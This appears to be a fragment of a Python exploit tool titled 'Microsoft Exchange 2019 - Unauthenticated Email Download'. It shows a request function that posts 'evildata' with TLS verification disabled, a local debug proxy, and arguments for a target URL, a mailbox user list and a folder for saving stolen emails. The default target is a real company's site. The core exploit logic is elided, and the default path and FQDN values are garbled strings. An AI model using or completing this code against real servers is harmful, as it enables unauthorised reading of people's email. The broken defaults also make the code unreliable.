...
def getFQDN(url):
    ...
    rs = requests.post(url , verify=False, data="evildata")
...
def main():
    ...
    __path__ = None
    print("[***** OhhWAA *****]")
    print("# Exploit Title: Microsoft Exchange 2019 - Unauthenticated Email Download")
...
__proxies__ = {"http": "http://127.0.0.1:4444",
               "https": "https://127.0.0.1:4444"}  # for debug on proxy
...
def main():
    ...
    print("# Exploit Title: Microsoft Exchange 2019 - Unauthenticated Email Download")
    parser = argparse.ArgumentParser(usage="Basic usage python %(prog)s -u <url> -l <users.txt> -p <path>")
    parser.add_argument('-u', "--url", help="Url, provide schema and not final / (eg https://example.org)", default='https://investor.coinbase.com')
    parser.add_argument('-l', "--list", help="Users mailbox list",  default='None')
    parser.add_argument("-p", "--path", help="Path to write emails in xml format", default='/cdn-cgi/l/email-protection#9bf2f5edfee8eff4e9dbf8f4f2f5f9fae8feb5f8f4f6')
    parser.add_argument('-f', "--fqdn", help="FQDN", required=False, default='9bf2f5edfee8eff4e9dbf8f4f2f5f9fae8feb5f8f4f6')
    parser.add_argument("-d", "--domain", help="Domain to check mailboxes (eg if .local dont work)", required=False, default=None)
    args = parser.parse_args()
    __URL__ = args.url
    __FQDN__ = args.fqdn
